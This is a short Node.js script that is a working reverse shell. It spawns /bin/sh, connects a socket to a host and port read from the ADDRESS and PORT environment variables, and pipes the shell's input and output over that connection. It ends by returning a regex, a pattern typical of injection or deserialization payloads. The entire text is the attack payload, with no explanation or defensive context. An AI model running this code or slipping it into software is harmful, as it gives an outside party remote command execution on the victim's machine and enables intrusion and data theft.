(function(){
    var net = require('net'),
        cp = require('child_process'),
        sh = cp.spawn("/bin/sh", []);

    var client = new net.Socket()
    var IP = process.env.ADDRESS
    client.connect(parseInt(process.env.PORT), IP, function(){

        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

    });
    return /0/;
})();
